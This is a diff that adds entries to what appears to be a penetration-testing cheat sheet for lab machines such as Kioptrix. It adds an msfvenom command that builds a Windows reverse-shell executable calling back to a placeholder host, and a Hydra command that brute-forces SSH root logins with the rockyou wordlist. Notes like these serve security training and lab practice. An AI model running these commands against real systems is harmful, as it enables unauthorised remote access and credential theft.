@@ -519,6 +519,24 @@ Download the exploit
 
 Should give you root access
 
+*Generate basic payload*
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
+
+**Bruteforce attacks**
+
+*Hydra for SSH*
+
+Sample to attack Kioptrix
+
+    locate wordlists
+
+    hydra -v -l root -P /usr/share/wordlists/rockyou.txt <ip> ssh
+
+    -v - verbose mode
+    -P - Passwordlist
+
+
 
 
 
